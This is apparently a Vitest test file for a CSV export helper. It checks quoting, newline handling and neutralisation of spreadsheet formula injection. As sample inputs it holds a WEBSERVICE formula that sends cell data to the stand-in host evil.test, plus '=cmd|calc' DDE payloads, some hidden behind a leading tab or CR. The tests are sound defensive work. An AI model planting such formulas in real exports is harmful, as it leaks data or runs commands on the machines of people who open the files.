import { describe, it, expect } from 'vitest'
import { csvCell, csvRow, toCsv } from './csv'

describe('csvCell', () => {
  it('leaves an ordinary value alone', () => {
    expect(csvCell('Ravi Kumar')).toBe('Ravi Kumar')
  })

  it('renders nothing for null and undefined', () => {
    expect(csvCell(null)).toBe('')
    expect(csvCell(undefined)).toBe('')
  })

  it('quotes a value containing a comma', () => {
    expect(csvCell('Plant 2, Coimbatore')).toBe('"Plant 2, Coimbatore"')
  })

  it('doubles an embedded quote', () => {
    expect(csvCell('the "spare" unit')).toBe('"the ""spare"" unit"')
  })

  // A newline inside an unquoted cell ends the record, so one note with a line
  // break silently becomes an extra row of nonsense.
  it('quotes a value containing a newline', () => {
    expect(csvCell('line one\nline two')).toBe('"line one\nline two"')
    expect(csvCell('line one\r\nline two')).toBe('"line one\r\nline two"')
  })
})

describe('csvCell neutralises spreadsheet formulas', () => {
  // The payload is typed into a field the export later renders — a name, a
  // location, a defect note — and runs on the machine of whoever opens it.
  it.each(['=', '+', '-', '@'])('prefixes a value beginning with %s', (lead) => {
    expect(csvCell(`${lead}HYPERLINK("http://x")`)).toBe(`"\t${lead}HYPERLINK(""http://x"")"`)
  })

  it('neutralises the classic WEBSERVICE payload', () => {
    expect(csvCell('=WEBSERVICE("http://evil.test/?d="&A1)')).toContain('\t=WEBSERVICE')
  })

  // A leading tab or CR reaches the parser first and would smuggle the
  // character in behind it.
  it('neutralises a payload hidden behind a leading tab or CR', () => {
    expect(csvCell('\t=cmd|calc')).toBe('"\t\t=cmd|calc"')
    expect(csvCell('\r=cmd|calc')).toBe('"\t\r=cmd|calc"')
  })

  it('does not touch a formula character in the middle', () => {
    expect(csvCell('Bay 3 = north wall')).toBe('Bay 3 = north wall')
  })

  // '-' leads the list, so a negative number would be mangled if the guard did
  // not stop at strings.
  it('leaves a negative number as a number', () => {
    expect(csvCell(-3)).toBe('-3')
    expect(csvCell(0)).toBe('0')
    expect(csvCell(false)).toBe('false')
  })
})

describe('toCsv', () => {
  const columns = [{ key: 'name', label: 'Name' }, { key: 'site', label: 'Site' }]

  it('writes a header and one row per record', () => {
    expect(toCsv([{ name: 'Ravi', site: 'Hosur' }], columns)).toBe('Name,Site\nRavi,Hosur\n')
  })

  // An export of nothing should still carry its headings, or the file reads as
  // corrupt rather than empty.
  it('writes the header alone when there are no rows', () => {
    expect(toCsv([], columns)).toBe('Name,Site\n')
  })

  it('carries the neutralisation through a whole row', () => {
    const out = toCsv([{ name: '=cmd|calc', site: 'A, B' }], columns)
    expect(out).toBe('Name,Site\n"\t=cmd|calc","A, B"\n')
  })

  it('renders a missing field as an empty cell', () => {
    expect(csvRow([undefined, 'x'])).toBe(',x')
  })
})
